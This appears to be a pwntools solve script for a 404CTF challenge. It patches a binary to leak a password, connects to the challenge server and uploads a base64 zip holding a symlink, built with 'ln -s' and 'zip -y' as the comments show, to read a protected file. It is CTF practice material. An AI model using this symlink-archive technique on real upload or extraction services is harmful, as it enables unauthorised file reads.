# First you need to patch the binary to leak the password
# at the same time you're connecting to the server.
from pwn import *
patched_binary = ELF("./cache_cache_le_retour")

# Read the password from the pacthed binary

run_patched = patched_binary.process()


password = run_patched.recvline().strip()
print(password)
# Stop the binary
run_patched.close()

# Connect to the server
run = remote("challenges.404ctf.fr", 31725)

# Send the password

run.recvuntil(b"mot de passe ?\n")
run.sendline(password)
print(run.recvuntil(b"au fond du couloir.\n"))
# ln -s salle_au_tresor surprise.txt
# zip -y mystere.zip surprise.txt
# base64 mystere.zip
# Utilizez cette base64 pour valider le challenge

# toFlag = b"UEsDBAoAAAAAAGIFr1bGNbk7BQAAAAUAAAAMABwAc3VycHJpc2UudHh0VVQJAAP4Y2Fk+GNhZHV4CwABBOgDAAAE6AMAAHRlc3QKUEsBAh4DCgAAAAAAYgWvVsY1uTsFAAAABQAAAAwAGAAAAAAAAQAAAKSBAAAAAHN1cnByaXNlLnR4dFVUBQAD+GNhZHV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAFIAAABLAAAAAAA="
toFlag = b"UEsDBAoAAAAAAEetkFaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAOWTzxklk88ZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAEetkFaLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAA5ZPPGR1eAsAAQToAwAABOgDAABQSwUGUEsDBAoAAAAAAMyskFaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAOwTjxksE48ZHV4CwABBOgDAAAE6AMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAAMyskFaLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAA7BOPGR1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAAAAAAAAEAAQBSAAAAVQAAAAAA"
run.sendline(toFlag)

print(run.recvline())
